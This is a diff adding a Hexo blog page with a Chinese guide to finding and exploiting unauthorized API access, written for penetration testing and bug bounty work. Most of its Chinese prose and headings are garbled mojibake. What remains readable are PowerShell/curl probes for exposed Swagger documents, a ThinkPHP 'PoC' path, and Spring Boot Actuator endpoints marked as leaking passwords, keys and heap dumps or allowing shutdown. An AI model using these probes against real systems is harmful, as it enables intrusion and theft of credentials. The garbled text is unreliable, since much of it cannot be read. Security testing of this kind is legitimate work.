@@ -1,0 +1,1012 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="API 鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡 鐗堟湰锛歷1.0 | **鏈€鍚庢洿鏂?*锛?026-07-08閫傜敤鍦烘櫙锛氭笚閫忔祴璇?&#x2F; SRC 鎸栨帢 &#x2F; 绾㈣摑瀵规姉 &#x2F; 瀹夊叏鍔犲浐   鐩綍 姒傝堪 婕忔礊鍒嗙被鎬昏 [Web API 妗嗘灦鏈巿鏉僝(#涓墂eb-api-妗嗘灦鏈巿鏉? 3.1 Swagger API 鏂囨。娉勯湶 3.2 S">
+<meta property="og:type" content="article">
+<meta property="og:title" content="API未授权访问分析与利用指南">
+<meta property="og:url" content="http://example.com/2026/07/09/API%E6%9C%AA%E6%8E%88%E6%9D%83/index.html">
+<meta property="og:site_name" content="xiokuの小さな世界">
+<meta property="og:description" content="API 鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡 鐗堟湰锛歷1.0 | **鏈€鍚庢洿鏂?*锛?026-07-08閫傜敤鍦烘櫙锛氭笚閫忔祴璇?&#x2F; SRC 鎸栨帢 &#x2F; 绾㈣摑瀵规姉 &#x2F; 瀹夊叏鍔犲浐   鐩綍 姒傝堪 婕忔礊鍒嗙被鎬昏 [Web API 妗嗘灦鏈巿鏉僝(#涓墂eb-api-妗嗘灦鏈巿鏉? 3.1 Swagger API 鏂囨。娉勯湶 3.2 S">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-07-09T08:07:15.000Z">
+<meta property="article:modified_time" content="2026-07-09T08:07:16.045Z">
+<meta property="article:author" content="Xioku">
+<meta property="article:tag" content="API">
+<meta property="article:tag" content="未授权">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2026/07/09/API%E6%9C%AA%E6%8E%88%E6%9D%83/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>API未授权访问分析与利用指南 | xiokuの小さな世界</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xiokuの小さな世界</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">xioku的小破站</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/07/09/API%E6%9C%AA%E6%8E%88%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Xioku">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xiokuの小さな世界">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          API未授权访问分析与利用指南
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2026-07-09 16:07:15 / Modified: 16:07:16" itemprop="dateCreated datePublished" datetime="2026-07-09T16:07:15+08:00">2026-07-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="API-鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡"><a href="#API-鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡" class="headerlink" title="API 鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡"></a>API 鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡</h1><blockquote>
+<p><strong>鐗堟湰</strong>锛歷1.0 | **鏈€鍚庢洿鏂?*锛?026-07-08<br><strong>閫傜敤鍦烘櫙</strong>锛氭笚閫忔祴璇?&#x2F; SRC 鎸栨帢 &#x2F; 绾㈣摑瀵规姉 &#x2F; 瀹夊叏鍔犲浐</p>
+</blockquote>
+<hr>
+<h2 id="鐩綍"><a href="#鐩綍" class="headerlink" title="鐩綍"></a>鐩綍</h2><ol>
+<li><a href="#%E6%B6%93%E2%82%AC%E5%A7%92%E5%82%9D%E5%A0%AA">姒傝堪</a></li>
+<li><a href="#%E6%B5%9C%E5%B1%BE%E7%B4%A1%E5%A8%B2%E7%82%B2%E5%9E%8E%E7%BB%AB%E7%BB%98%E2%82%AC%E6%98%8F%EE%9D%8D">婕忔礊鍒嗙被鎬昏</a></li>
+<li>[Web API 妗嗘灦鏈巿鏉僝(#涓墂eb-api-妗嗘灦鏈巿鏉?<ul>
+<li>3.1 Swagger API 鏂囨。娉勯湶</li>
+<li>3.2 Spring Boot Actuator 鏈巿鏉?   - 3.3 Druid 鐩戞帶鏈巿鏉?   - 3.4 GraphQL 鑷渷鏌ヨ娉勯湶</li>
+<li>3.5 ASP.NET Swagger &#x2F; SignalR 鏈巿鏉?4. [涓棿浠?&#x2F; 鏈嶅姟 API 鏈巿鏉僝(#鍥涗腑闂翠欢–鏈嶅姟-api-鏈巿鏉?</li>
+<li>4.1 Redis 鏈巿鏉冭闂?   - 4.2 MongoDB 鏈巿鏉冭闂?   - 4.3 Elasticsearch 鏈巿鏉冭闂?   - 4.4 Docker Remote API 鏈巿鏉?   - 4.5 Jenkins 鏈巿鏉冭闂?   - 4.6 Hadoop YARN ResourceManager 鏈巿鏉?   - 4.7 Zookeeper 鏈巿鏉冭闂?   - 4.8 Memcached 鏈巿鏉冭闂?5. [CMS &#x2F; 搴旂敤 API 鏈巿鏉冿紙鍚?CVE &amp; PoC锛塢(#浜攃ms–搴旂敤-api-鏈巿鏉冨惈-cve–poc)</li>
+<li>5.1 Joomla REST API 鏈巿鏉冿紙CVE-2023-23752锛?   - 5.2 WordPress REST API 鐢ㄦ埛淇℃伅娉勯湶</li>
+<li>5.3 ThinkPHP API 鏈巿鏉?   - 5.4 閫氳揪OA API 鏈巿鏉?   - 5.5 鑷磋繙OA API 鏈巿鏉?   - 5.6 鐢ㄥ弸NC API 鏈巿鏉?6. [涓氬姟閫昏緫灞?API 鏈巿鏉僝(#鍏笟鍔￠€昏緫灞?api-鏈巿鏉?</li>
+<li>6.1 姘村钩瓒婃潈锛圛DOR锛?   - 6.2 鍨傜洿瓒婃潈</li>
+<li>6.3 鏈巿鏉冩晱鎰熸帴鍙?   - 6.4 鎺ュ彛鍙傛暟閬嶅巻</li>
+<li>6.5 JWT 鏈巿鏉?&#x2F; 浼€?7. <a href="#%E6%B6%93%E5%86%A8%E7%96%84%E9%8E%B4%E6%A8%BB%EE%97%85%E5%A8%B4%E5%AC%AB%E6%9F%9F%E5%A8%89%E6%9B%A1%EE%86%91">瀹炴垬妫€娴嬫柟娉曡</a></li>
+<li>7.1 淇℃伅鏀堕泦闃舵</li>
+<li>7.2 鏈巿鏉冩娴嬮樁娈?   - 7.3 鍒╃敤闃舵</li>
+</ul>
+</li>
+<li>[閫氱敤妫€娴嬭剼鏈琞(#鍏€氱敤妫€娴嬭剼鏈?</li>
+<li>[闃插尽寤鸿](#涔濋槻寰″缓璁?</li>
+<li>[闄勫綍锛欳VE 閫熸煡琛╙(#鍗侀檮褰昪ve-閫熸煡琛?</li>
+</ol>
+<hr>
+<h2 id="涓€銆佹杩"><a href="#涓€銆佹杩" class="headerlink" title="涓€銆佹杩?"></a>涓€銆佹杩?</h2><h3 id="1-1-浠€涔堟槸-API-鏈巿鏉冭闂"><a href="#1-1-浠€涔堟槸-API-鏈巿鏉冭闂" class="headerlink" title="1.1 浠€涔堟槸 API 鏈巿鏉冭闂?"></a>1.1 浠€涔堟槸 API 鏈巿鏉冭闂?</h3><p>API 鏈巿鏉冭闂槸鎸?*绯荤粺鏈 API 鎺ュ彛杩涜鏈夋晥鐨勮韩浠借璇佸拰鏉冮檺鏍￠獙**锛屽鑷存湭缁忔巿鏉冪殑鐢ㄦ埛鑳藉鐩存帴璁块棶鎴栨搷浣滄湰搴斿彈闄愮殑璧勬簮鎴栧姛鑳姐€?</p>
+<h3 id="1-2-婕忔礊鎴愬洜"><a href="#1-2-婕忔礊鎴愬洜" class="headerlink" title="1.2 婕忔礊鎴愬洜"></a>1.2 婕忔礊鎴愬洜</h3><table>
+<thead>
+<tr>
+<th align="left">鍘熷洜</th>
+<th align="left">璇存槑</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">寮€鍙戦仐鐣?</td>
+<td align="left">寮€鍙戦樁娈典负浜嗘柟渚胯皟璇曪紝鎺ュ彛鏈姞閴存潈锛屼笂绾垮悗蹇樿绉婚櫎</td>
+</tr>
+<tr>
+<td align="left">閴存潈浠ｇ爜缂洪櫡</td>
+<td align="left">杩囨护鍣?鎷︽埅鍣ㄩ厤缃仐婕忥紝浠呭閮ㄥ垎璺緞鐢熸晥</td>
+</tr>
+<tr>
+<td align="left">妗嗘灦榛樿閰嶇疆</td>
+<td align="left">Swagger銆丏ruid銆丄ctuator 绛夌洃鎺х粍浠堕粯璁や笉閴存潈</td>
+</tr>
+<tr>
+<td align="left">涓棿浠跺畨鍏ㄩ厤缃己澶?</td>
+<td align="left">Redis銆丮ongoDB銆丏ocker 绛夐粯璁ゆ棤瀵嗙爜</td>
+</tr>
+<tr>
+<td align="left">鏉冮檺鏍￠獙閫昏緫缂洪櫡</td>
+<td align="left">浠呮牎楠屽墠绔殣钘忔寜閽紝鍚庣鏈仛浜屾鏍￠獙</td>
+</tr>
+<tr>
+<td align="left">RESTful API 璁捐缂洪櫡</td>
+<td align="left">閫氳繃鍙傛暟鎺у埗鏉冮檺锛屾湭鏍￠獙璧勬簮褰掑睘</td>
+</tr>
+</tbody></table>
+<h3 id="1-3-婕忔礊鍗卞"><a href="#1-3-婕忔礊鍗卞" class="headerlink" title="1.3 婕忔礊鍗卞"></a>1.3 婕忔礊鍗卞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">淇℃伅娉勯湶 鈫?鏁版嵁搴撻厤缃?/ 鐢ㄦ埛鏁版嵁 / 涓氬姟鏁忔劅鏁版嵁</span><br><span class="line">鏉冮檺鎻愬崌 鈫?鏅€氱敤鎴?鈫?绠＄悊鍛?瓒婃潈鎿嶄綔 鈫?淇敼浠栦汉鏁版嵁 / 鍒犻櫎浠栦汉璧勬簮</span><br><span class="line">浠ｇ爜鎵ц 鈫?閫氳繃鏂囦欢涓婁紶 / 鍙嶅簭鍒楀寲 / 鍛戒护娉ㄥ叆鐩存帴 Getshell</span><br><span class="line">妯悜绉诲姩 鈫?閫氳繃 SSRF 鎺㈡祴鍐呯綉 / 閫氳繃娉勯湶鐨勫嚟璇佹í鍚戞墿灞?```</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">## 浜屻€佹紡娲炲垎绫绘€昏</span><br><span class="line"></span><br><span class="line">| 鍒嗙被 | 婕忔礊绫诲瀷 | 椋庨櫓绛夌骇 | 鏀诲嚮澶嶆潅搴?| 甯歌鍦烘櫙 |</span><br><span class="line">|:-----|:---------|:--------:|:----------:|:---------|</span><br><span class="line">| **Web API 妗嗘灦** | Swagger 鏂囨。娉勯湶 | 猸愨瓙猸愨瓙 | 鏋佷綆 | Spring Boot / ASP.NET 椤圭洰 |</span><br><span class="line">| | Spring Boot Actuator 鏈巿鏉?| 猸愨瓙猸愨瓙猸?| 鏋佷綆 | Spring Boot 椤圭洰 |</span><br><span class="line">| | Druid 鐩戞帶鏈巿鏉?| 猸愨瓙猸愨瓙 | 鏋佷綆 | Java 椤圭洰锛堥樋閲屽反宸达級 |</span><br><span class="line">| | GraphQL 鑷渷鏌ヨ娉勯湶 | 猸愨瓙猸愨瓙 | 浣?| GraphQL 鎺ュ彛 |</span><br><span class="line">| **涓棿浠?鏈嶅姟** | Redis 鏈巿鏉?| 猸愨瓙猸愨瓙猸?| 浣?| 缂撳瓨鏈嶅姟 |</span><br><span class="line">| | MongoDB 鏈巿鏉?| 猸愨瓙猸愨瓙猸?| 浣?| 鏁版嵁搴撴湇鍔?|</span><br><span class="line">| | Elasticsearch 鏈巿鏉?| 猸愨瓙猸愨瓙 | 浣?| 鎼滅储寮曟搸 |</span><br><span class="line">| | Docker Remote API 鏈巿鏉?| 猸愨瓙猸愨瓙猸?| 浣?| 瀹瑰櫒鏈嶅姟 |</span><br><span class="line">| | Jenkins 鏈巿鏉?| 猸愨瓙猸愨瓙猸?| 浣?| CI/CD 鏈嶅姟 |</span><br><span class="line">| | Hadoop YARN 鏈巿鏉?| 猸愨瓙猸愨瓙 | 浣?| 澶ф暟鎹钩鍙?|</span><br><span class="line">| | Zookeeper 鏈巿鏉?| 猸愨瓙猸?| 浣?| 鍒嗗竷寮忓崗璋?|</span><br><span class="line">| **CMS/搴旂敤** | Joomla API 鏈巿鏉?(CVE-2023-23752) | 猸愨瓙猸愨瓙 | 浣?| Joomla CMS |</span><br><span class="line">| | WordPress API 鐢ㄦ埛娉勯湶 | 猸愨瓙猸?| 浣?| WordPress 绔欑偣 |</span><br><span class="line">| | ThinkPHP API 鏈巿鏉?| 猸愨瓙猸愨瓙 | 浣?| ThinkPHP 搴旂敤 |</span><br><span class="line">| | 閫氳揪OA API 鏈巿鏉?| 猸愨瓙猸愨瓙猸?| 浣?| 鍔炲叕绯荤粺 |</span><br><span class="line">| | 鑷磋繙OA API 鏈巿鏉?| 猸愨瓙猸愨瓙猸?| 浣?| 鍔炲叕绯荤粺 |</span><br><span class="line">| | 鐢ㄥ弸NC API 鏈巿鏉?| 猸愨瓙猸愨瓙猸?| 浣?| ERP 绯荤粺 |</span><br><span class="line">| **涓氬姟閫昏緫灞?* | 姘村钩瓒婃潈锛圛DOR锛?| 猸愨瓙猸愨瓙 | 浣?| 鍑犱箮鎵€鏈変笟鍔＄郴缁?|</span><br><span class="line">| | 鍨傜洿瓒婃潈 | 猸愨瓙猸愨瓙猸?| 涓?| 澶氳鑹茬郴缁?|</span><br><span class="line">| | JWT 鏈巿鏉?/ 浼€?| 猸愨瓙猸愨瓙 | 涓?| 鍓嶅悗绔垎绂绘灦鏋?|</span><br><span class="line">| | 鎺ュ彛鍙傛暟閬嶅巻 | 猸愨瓙猸?| 鏋佷綆 | 鍒楄〃/璇︽儏鎺ュ彛 |</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">## 涓夈€乄eb API 妗嗘灦鏈巿鏉?</span><br><span class="line">### 3.1 Swagger API 鏂囨。娉勯湶</span><br><span class="line"></span><br><span class="line">Swagger 鏄竴涓鑼冨拰瀹屾暣鐨?RESTful API 妗嗘灦銆傚紑鍙戠幆澧冧腑 Swagger 椤甸潰琚毚闇插埌鐢熶骇鐜锛屾敾鍑昏€呭彲閫氳繃 Swagger 椤甸潰鑾峰彇**鍏ㄩ儴 API 鎺ュ彛鍒楄〃銆佸弬鏁般€佽姹傛柟寮?*锛屽苟鍙洿鎺ュ湪椤甸潰涓婅皟鐢ㄦ帴鍙ｃ€?</span><br><span class="line">#### 妫€娴嬭矾寰?</span><br></pre></td></tr></table></figure>
+<p>&#x2F;swagger-ui.html<br>&#x2F;swagger-ui.html#&#x2F;<br>&#x2F;swagger-ui&#x2F;index.html<br>&#x2F;swagger-resources<br>&#x2F;v2&#x2F;api-docs<br>&#x2F;v3&#x2F;api-docs<br>&#x2F;swagger&#x2F;v1&#x2F;swagger.json<br>&#x2F;api&#x2F;swagger<br>&#x2F;api-docs<br>&#x2F;api&#x2F;doc<br>&#x2F;swagger</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 鍗卞</span><br><span class="line"></span><br><span class="line">- 鑾峰彇鍏ㄩ噺 API 鎺ュ彛鍒楄〃</span><br><span class="line">- 鍙戠幇鏈壌鏉冪殑鏁忔劅鎺ュ彛锛堟枃浠朵笂浼犮€佺敤鎴风鐞嗐€佹暟鎹鍑虹瓑锛?- 鐩存帴閫氳繃 Swagger UI 椤甸潰璋冪敤鎺ュ彛</span><br><span class="line"></span><br><span class="line">#### 妫€娴?PoC</span><br><span class="line"></span><br><span class="line">```powershell</span><br><span class="line"># 1. 妫€娴?Swagger 椤甸潰</span><br><span class="line">curl -s &quot;http://target.com/swagger-ui.html&quot; -o /dev/null -w &quot;%&#123;http_code&#125;&quot;</span><br><span class="line"></span><br><span class="line"># 2. 妫€娴?API 鏂囨。 JSON</span><br><span class="line">curl -s &quot;http://target.com/v2/api-docs&quot; | Select-Object -First 1</span><br><span class="line"></span><br><span class="line"># 3. 鎵归噺璺緞妫€娴?$paths = @(&quot;/swagger-ui.html&quot;, &quot;/v2/api-docs&quot;, &quot;/v3/api-docs&quot;, &quot;/swagger-resources&quot;)</span><br><span class="line">foreach ($p in $paths) &#123;</span><br><span class="line">  $code = try &#123; (Invoke-WebRequest -Uri &quot;http://target.com$p&quot; -TimeoutSec 5 -UseBasicParsing).StatusCode &#125; catch &#123; 0 &#125;</span><br><span class="line">  if ($code -eq 200) &#123; Write-Host &quot;[FOUND] $p&quot; -ForegroundColor Green &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="瀹炰緥濡傦細ThinkPHP-5-x-寮哄埗璺敱-Swagger-鏈巿鏉"><a href="#瀹炰緥濡傦細ThinkPHP-5-x-寮哄埗璺敱-Swagger-鏈巿鏉" class="headerlink" title="瀹炰緥濡傦細ThinkPHP 5.x 寮哄埗璺敱 + Swagger 鏈巿鏉?"></a>瀹炰緥濡傦細ThinkPHP 5.x 寮哄埗璺敱 + Swagger 鏈巿鏉?</h4><p>ThinkPHP 5.x 鍦ㄦ湭寮€鍚己鍒惰矾鐢辨椂锛屾敾鍑昏€呭彲閫氳繃 Swagger 椤甸潰鐩存帴璋冪敤浠绘剰鎺у埗鍣ㄦ柟娉曪紝瀵艰嚧 RCE銆?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PoC: /api/index.php?s=index/Index/hello&amp;name=world</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="3-2-Spring-Boot-Actuator-鏈巿鏉"><a href="#3-2-Spring-Boot-Actuator-鏈巿鏉" class="headerlink" title="3.2 Spring Boot Actuator 鏈巿鏉?"></a>3.2 Spring Boot Actuator 鏈巿鏉?</h3><p>Spring Boot Actuator 鎻愪緵浜嗙敓浜х骇鍒殑搴旂敤鐩戞帶鍔熻兘銆傚鏋滄湭閰嶇疆璁块棶鎺у埗锛屾敾鍑昏€呭彲閫氳繃 Actuator 绔偣鑾峰彇澶ч噺鏁忔劅淇℃伅銆?</p>
+<h4 id="妫€娴嬭矾寰"><a href="#妫€娴嬭矾寰" class="headerlink" title="妫€娴嬭矾寰?"></a>妫€娴嬭矾寰?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/actuator</span><br><span class="line">/actuator/health</span><br><span class="line">/actuator/info</span><br><span class="line">/actuator/env          鈫?鐜鍙橀噺锛堝惈鏁版嵁搴撳瘑鐮併€丄PI瀵嗛挜锛?/actuator/configprops  鈫?閰嶇疆灞炴€э紙鍚晱鎰熼厤缃級</span><br><span class="line">/actuator/mappings     鈫?鍏ㄩ噺鎺ュ彛鏄犲皠</span><br><span class="line">/actuator/beans        鈫?Spring Bean 淇℃伅</span><br><span class="line">/actuator/heapdump     鈫?鍫嗗唴瀛樿浆鍌紙鍙笅杞藉垎鏋愶級</span><br><span class="line">/actuator/threaddump   鈫?绾跨▼淇℃伅</span><br><span class="line">/actuator/loggers      鈫?鏃ュ織绾у埆鎺у埗</span><br><span class="line">/actuator/httptrace    鈫?HTTP 璇锋眰杩借釜</span><br><span class="line">/actuator/metrics      鈫?鎸囨爣鐩戞帶</span><br><span class="line">/actuator/scheduledtasks 鈫?瀹氭椂浠诲姟</span><br><span class="line">/actuator/shutdown     鈫?鍏抽棴搴旂敤锛圥OST锛?/actuator/gateway      鈫?Spring Cloud Gateway 璺敱</span><br></pre></td></tr></table></figure>
+
+<h4 id="鍗卞绛夌骇锛堢敱楂樺埌浣庯級"><a href="#鍗卞绛夌骇锛堢敱楂樺埌浣庯級" class="headerlink" title="鍗卞绛夌骇锛堢敱楂樺埌浣庯級"></a>鍗卞绛夌骇锛堢敱楂樺埌浣庯級</h4><table>
+<thead>
+<tr>
+<th align="left">绔偣</th>
+<th align="left">鍗卞</th>
+<th align="left">璇存槑</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>/actuator/env</code></td>
+<td align="left">猸愨瓙猸愨瓙猸?</td>
+<td align="left">娉勯湶鏁版嵁搴撳瘑鐮併€丷edis 瀵嗙爜銆佸瘑閽ャ€丄PI Token</td>
+</tr>
+<tr>
+<td align="left"><code>/actuator/heapdump</code></td>
+<td align="left">猸愨瓙猸愨瓙猸?</td>
+<td align="left">涓嬭浇鍫嗗唴瀛?鈫?鍒嗘瀽鍑烘墍鏈夎繍琛屾椂鐨勫瘑鐮佸拰瀵嗛挜</td>
+</tr>
+<tr>
+<td align="left"><code>/actuator/configprops</code></td>
+<td align="left">猸愨瓙猸愨瓙</td>
+<td align="left">娉勯湶閰嶇疆涓殑鏁忔劅淇℃伅</td>
+</tr>
+<tr>
+<td align="left"><code>/actuator/mappings</code></td>
+<td align="left">猸愨瓙猸愨瓙</td>
+<td align="left">鍏ㄩ噺 API 鎺ュ彛璺緞锛堣緟鍔╂寲鎺樻洿澶氭紡娲烇級</td>
+</tr>
+<tr>
+<td align="left"><code>/actuator/gateway</code></td>
+<td align="left">猸愨瓙猸愨瓙</td>
+<td align="left">Spring Cloud Gateway 璺敱淇℃伅</td>
+</tr>
+<tr>
+<td align="left"><code>/actuator/loggers</code></td>
+<td align="left">猸愨瓙猸?</td>
+<td align="left">淇敼鏃ュ織绾у埆涓?DEBUG锛岃幏鍙栨洿澶氫俊鎭?</td>
+</tr>
+<tr>
+<td align="left"><code>/actuator/shutdown</code></td>
+<td align="left">猸愨瓙猸?</td>
+<td align="left">鎷掔粷鏈嶅姟</td>
+</tr>
+</tbody></table>
